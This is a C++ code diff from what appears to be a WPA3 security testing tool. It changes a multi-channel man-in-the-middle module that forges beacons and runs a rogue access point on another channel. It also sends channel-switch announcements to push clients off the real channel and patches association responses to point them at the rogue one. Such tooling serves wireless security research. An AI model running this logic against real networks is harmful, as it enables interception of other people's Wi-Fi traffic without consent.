@@ -48,6 +48,8 @@ namespace wpa3_tester{
 
     void McMitm::send_fake_real_beacon_on_real_chan() const{
         auto* fake = beacon_old->clone();
+        fake->addr1(Dot11::BROADCAST);
+        fake->addr4(Dot11::BROADCAST);
 
         uint8_t ch = netconfig.rogue_channel;
         fake->remove_option(Dot11::DS_SET);
@@ -58,9 +60,9 @@ namespace wpa3_tester{
         fake->timestamp(now_us + 1000000); // +1 sekunda dopředu
 
         RadioTap rt;
-        const int freq_mhz = hw_capabilities::channel_to_freq(netconfig.real_channel);
-        rt.channel(freq_mhz, RadioTap::OFDM);
-        rt.flags(RadioTap::FCS);
+        //const int freq_mhz = hw_capabilities::channel_to_freq(netconfig.real_channel);
+        //rt.channel(freq_mhz, RadioTap::OFDM);
+        //rt.flags(RadioTap::FCS);
         rt.inner_pdu(fake);
         sender_real->send(rt, r_client_iface);
     }
@@ -136,13 +138,17 @@ namespace wpa3_tester{
 
                 send_fake_real_beacon_on_real_chan();
 
-                RadioTap rt;
+                RadioTap rt{};
                 const auto now_us = duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count();
+
+                //log(LogLevel::INFO, "Beacon DS channel: %d", beacon->ds_parameter_set());
                 const auto actual_beacon = beacon->clone();
+                //log(LogLevel::INFO, "Clone DS channel: %d", actual_beacon->ds_parameter_set());
+
                 //actual_beacon->timestamp(now_us);
                 //actual_beacon->seq_num(sn++);
                 rt.inner_pdu(actual_beacon);
-                sender_rogue->send(rt, r_client_iface);
+                sender_rogue->send(rt, r_ap_iface);
 
                 next_beacon += 0.10;
             }
@@ -251,7 +257,7 @@ namespace wpa3_tester{
 
         // Frames from client TO real AP — push back to rogue channel via CSA
         if (addr1 == ap_mac) {
-            if (dot11->subtype() == Dot11::AUTH) {
+            if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::AUTH) {
                 log(LogLevel::WARNING, "Client %s connecting on real channel, sending CSA", addr2.c_str());
                 CSA_attack::send_CSA_beacon(ap_mac, r_client_iface, ssid,
                                             netconfig.real_channel, netconfig.rogue_channel, 1);
@@ -260,14 +266,18 @@ namespace wpa3_tester{
             return;
         }
 
-        // Frames from real AP — forward to rogue channel with patched channel IE
-        if (addr2 == ap_mac) {
-            if (dot11->subtype() == Dot11::BEACON || dot11->subtype() == Dot11::PROBE_RESP){
-                last_real_beacon = now_sec();
-                return;
-            }
+        if (dot11->type() == Dot11::MANAGEMENT && (
+                dot11->subtype() == Dot11::BEACON ||
+                dot11->subtype() == Dot11::PROBE_RESP ||
+                dot11->subtype() == Dot11::PROBE_REQ ||
+                dot11->subtype() == Dot11::DEAUTH)){
+            last_real_beacon = now_sec();
+            return;
+        }
 
-            if (dot11->subtype() == Dot11::ASSOC_RESP) {
+        // Frames from real AP — forward to rogue channel with patched channel IE
+        if (addr2 == ap_mac && addr1 == client_mac) {
+            if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::ASSOC_RESP) {
                 if (const auto* assoc = pdu.find_pdu<Dot11AssocResponse>()) {
                     const unique_ptr<Dot11AssocResponse> patched(assoc_resp_channel_patch(*assoc, netconfig.rogue_channel));
                     RadioTap rt;
@@ -296,7 +306,7 @@ namespace wpa3_tester{
             addr2 = data->addr2().to_string();
 
 
-        if (dot11->subtype() == Dot11::PROBE_REQ) { // include broadcast
+        if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::PROBE_REQ) { // include broadcast
             probe_resp->addr1(addr2);
 
             RadioTap rt;
